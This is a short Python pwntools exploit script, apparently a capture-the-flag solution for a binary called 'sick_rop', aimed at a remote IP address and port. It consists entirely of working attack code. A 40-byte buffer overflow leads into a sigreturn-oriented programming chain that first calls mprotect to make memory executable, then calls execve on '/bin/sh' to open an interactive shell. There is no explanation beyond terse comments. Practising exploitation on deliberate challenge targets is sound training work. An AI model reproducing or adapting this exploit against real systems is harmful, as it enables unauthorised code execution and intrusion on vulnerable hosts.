from pwn import * 

context.clear(arch='amd64')

def main():

	host = "188.166.173.208"
	port = 31588
	local = False

	if local:
		
		p = process("./sick_rop")
		 
	else:
		
		p = remote(host, port)
	
	vuln = 0x000000000040102e
	syscall = 0x0000000000401014
	offset = 40 

	frame = SigreturnFrame(kernel="amd64")
	frame.rax = 10
	frame.rsi = 0x1000 
	frame.rdi = 0x401000
	frame.rdx = 7
	frame.rsp = 0x4010d8  #pointer to 'vuln' function
	frame.rip = syscall

	#build ROP chain 
	payload = b"A" * offset 
	payload += p64(vuln)
	payload += p64(syscall)
	payload += bytes(frame)

	p.send(payload)
	p.recv(1024)

	p.send('A' * 15)	
	p.recv(1024)

	# second frame 
	frame = SigreturnFrame(kernel="amd64")
	frame.rax = 0x3b        # execve
	frame.rdi = 0x4011e8    # filename ('/bin/sh')
	frame.rsi = 0           # argv
	frame.rdx = 0           # envp
	frame.rsp = 0
	frame.rip = syscall

	payload2 = b'\x90' * offset 
	payload2 += p64(vuln)
	payload2 += p64(syscall)
	payload2 += bytes(frame)
	payload2 += b'/bin/sh'
	payload2 += b'\x00'

	p.send(payload2)
	p.recv(1024)

	p.send(b'A' * 15)
	p.recv(1024)

	p.interactive()
if __name__ == "__main__":

	main()